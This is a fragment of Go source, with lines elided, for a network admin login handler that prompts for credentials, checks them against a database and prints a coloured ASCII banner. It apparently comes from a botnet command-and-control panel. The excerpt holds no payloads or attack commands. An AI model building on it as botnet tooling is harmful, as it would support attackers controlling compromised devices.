...
func (this *Admin) Handle() {
    ...
    this.conn.Write([]byte("\x1b[0;36mUserName\x1b[1;30m: \033[0m"))
    ...
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0;36mPassword\x1b[1;30m: \033[0m"))
    ...
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;34mWrong Credentials, Try Again.\r\n"))
            this.conn.Write([]byte("\r\x1b[0;37m                       888 .d8888b.                       \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m                       888d88P  Y88b                      \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m                       888888    888                      \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m               88888b. 888888    888888  888              \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m               888  88b888888    888 Y8bd8P               \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m               888  888888888    888  X88K                \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m               888 d88P888Y88b  d88P.d8  8b.              \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m               88888P  888  Y8888P  888  888              \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m               888                                        \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m               888                                        \r\n"))
            this.conn.Write([]byte("\r\x1b[0;36m               888                                        \r\n"))
            buf := make([]byte, 1)
            this.conn.Read(buf)
